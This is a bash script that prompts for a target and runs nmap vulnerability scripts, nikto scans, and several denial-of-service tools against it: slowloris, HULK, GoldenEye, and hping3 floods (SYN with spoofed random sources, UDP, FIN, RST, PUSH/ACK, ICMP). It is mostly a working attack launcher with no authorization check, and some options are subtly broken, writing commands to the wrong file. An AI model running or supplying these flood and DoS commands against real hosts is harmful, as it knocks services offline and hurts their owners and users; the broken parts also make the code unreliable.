#!/bin/bash


# Ask the user for the target
intro()
{
echo -n "What is your target?"
read target
echo "$target" > target.txt #use  >> if you would like to append instead of overwriting
}
intro
# scripts nmap - vulnerability assessment
nmap()
{
    echo -n "Would you like to run a basic vulnerability assessment?(y/n)"
    read response
    if [[ $response == "Y" || $response == "y" ]]; then
        echo "- - - - - - - - - - - - - - - - - - - - - - -"
        echo "Great! Here are some options for you!"
        echo "1) Automatically perform everything (it should take about 30 mins)"
        echo "2) HTTP headers"
        echo "3) Any possible exploits"
        echo -n "Which one would you like to perform?"
        read ch
        if [[ $ch == "1" ]]; then
          cd scripts
          bash *.sh
        elif [[ $ch == "2" ]]; then
          cd scripts
          bash firewalk.sh
          bash dns.sh
          bash http_common.sh
          bash ipv6.sh
          bash server-header.sh
          bash smb_common.sh
          bash traceroute.sh
          bash security-headers.sh
          bash header.sh
          bash http_vuln_common.sh
        elif [[ $ch == "3" ]]; then
          cd scripts
          bash affiliation.sh
          bash auth.sh
          bash git.sh
          bash malware.sh
          bash waf.sh
        else
          echo "We will not run any of scripts as you said"
        fi

    else
        echo "We will not run any of scripts as you said"
    fi
}
nmap
#dos - slowloris
slowloris()
{
    echo -n "Would you like to perform DoS?(y/n)"
    read dos
    if [[ $dos == "Y" || $dos == "y" ]]; then
        cd tools/slowloris.pl
        touch attack.txt
        echo -n "perl slowloris.pl -dns " > attack.txt
        cd ../..
        echo -n "$target" >> tools/slowloris.pl/attack.txt
        cd tools/slowloris.pl/
        bash attack.txt
    else
        echo "We will not run any of scripts as you said"
    fi
}
#slowloris
#nikto - overall basic scan [vulnerability assessment]
nikto()
{
    echo -n "Would you like to perform a vulnerability assessment?(y/n)?"
    read nikto
    if [[ $nikto == "Y" || $nikto == "y" ]]; then
        cd tools/nikto
        touch attack_nikto.txt
        echo "DEBUG _ _ _ "
        pwd
        echo "DEBUG - - - "
        echo -n "nikto -Display 1234EP -o report_nikto.html -Format htm -Tuning 58 -host " > attack_nikto.txt
        cd ../..
        echo "WE ARE BACK" && pwd
        echo -n "$target" >> tools/nikto/attack_nikto.txt
        cd tools/nikto
        bash attack_nikto.txt
        # move report_nikto.html to /results
        mv report_nikto.html ../..
        cd ../..
        mv report_nikto.html results/
    else
        echo "We will not run any of scripts as you said"
    fi
}
#nikto
#hulk
hulk()
{
    echo -n "Would you like to perform DoS? [HULK] (y/n)?"
    read hulk
    if [[ $hulk == "Y" || $hulk == "y" ]]; then
        cd tools/nikto/hulk
        touch attack_hulk.txt
        echo -n "python hulk.py -site " > attack_hulk.txt
        cd ../.. && cd ..
        echo -n "$target" >> tools/nikto/hulk/attack_hulk.txt
        cd tools/nikto/hulk
        bash attack_hulk.txt
    else
        echo "We will not run any of scripts as you said"
    fi
}
#hulk
#hping
hping()
{
    echo -n "Would you like to perform Flood? [hping3] (y/n)?"
    read hping
    if [[ $hping == "Y" || $hping == "y" ]]; then
        cd results
        mkdir hping
        echo "- - - - - - - - - - - - - - - - - - - - - - -"
        echo "Here are possible options on what to do?"
        echo " "
        echo "1) Check whether a host is alive (when PING is blocked) - send RST"
        echo "2) Perform DoS attack"
        echo "3) Perform UDP flood"
        echo "4) Perform TCP FIN flood"
        echo "5) Perform TCP RST flood"
        echo "6) Perform PUSH and ACK floods"
        echo "7) Perform ICMP and IGMP floods"
        echo "- - - - - - - - - - - - - - - - - - - - - - -"
        echo -n "Which one would you like to do?"
        read choice
        if [[ $choice == "1" ]]; then
          cd hping/
          touch host_alive.txt
          echo -n "hping3 -c 2 -V -p 80 -s 5050 -a " > host_alive.txt
          cd ..
          echo -n "$target" >> hping/host_alive.txt
          cd hping/
          bash host_alive.txt
          cd ..
        elif [[ $choice == "2" ]]; then
          cd hping/
          touch hping_dos.txt
          echo -n "hping3 -c 20000 -d 120 -S -w 64 -p 80 --flood --rand-source " > hping_dos.txt #we will do port 80, in specific cases you can manually change it to port 443
          cd ..
          echo -n "$target" >> hping/hping_dos.txt
          cd hping/
          bash hping_dos.txt
          cd ..

        elif [[ $choice == "3" ]]; then
          cd hping/
          touch hping_udp.txt
          echo -n "hping3 --flood --rand-source --udp -p 80 " > hping_dos.txt #we will do port 80, in specific cases you can manually change it to port 443
          cd ..
          echo -n "$target" >> hping/hping_udp.txt
          cd hping/
          bash hping_udp.txt
          cd ..
        elif [[ $choice == "4" ]]; then
          cd hping/
          touch hping_tcp_fin.txt
          echo -n "hping3 --flood --rand-source -F -p 80 " > hping_tcp_fin.txt #we will do port 80, in specific cases you can manually change it to port 443
          cd ..
          echo -n "$target" >> hping/hping_tcp_fin.txt
          cd hping/
          bash hping_tcp_fin.txt
          cd ..
        elif [[ $choice == "5" ]]; then
          cd hping/
          touch hping_tcp_rst.txt
          echo -n "hping3 --flood --rand-source -R -p 80 " > hping_tcp_fin.txt #we will do port 80, in specific cases you can manually change it to port 443
          cd ..
          echo -n "$target" >> hping/hping_tcp_rst.txt
          cd hping/
          bash hping_tcp_rst.txt
          cd ..
        elif [[ $choice == "6" ]]; then
          cd hping/
          touch hping_puch_ack.txt
          echo -n "hping3 --flood --rand-source -PA -p 80 " > hping_puch_ack.txt #we will do port 80, in specific cases you can manually change it to port 443
          cd ..
          echo -n "$target" >> hping/hping_puch_ack.txt
          cd hping/
          bash hping_puch_ack.txt
          cd ..
        elif [[ $choice == "7" ]]; then
          cd hping/
          touch hping_icmp_igmp.txt
          echo -n "hping3 --flood --rand-source -1 -p 80 " > hping_icmp_igmp.txt #we will do port 80, in specific cases you can manually change it to port 443
          cd ..
          echo -n "$target" >> hping/hping_icmp_igmp.txt
          cd hping/
          bash hping_icmp_igmp.txt
          cd ..
        else
          echo -n "Would you like to do it over again? (y/n)"
          read repeat
          if [[ $repeat == "Y" || $repeat == "y" ]]; then
            hping
          else
            exit
          fi
        fi
    else
        echo "We will not run any of scripts as you said"
fi
}
#hping
#GoldenEye
golden_eye()
{
  echo -n "Would you like to perform DoS? [GoldenEye] (y/n)?"
  read eye
  if [[ $eye == "Y" || $eye == "y" ]]; then
    cd tools/GoldenEye/
    touch attack_dos.txt
    echo "python goldeneye.py https://" > attack_dos.txt
    cd ../..
    echo -n "$target" >> tools/GoldenEye/attack_dos.txt
    cd tools/GoldenEye
    bash attack_dos.txt
    cd ..
  else
    echo "We will not run any of scripts as you said"
fi
}
golden_eye
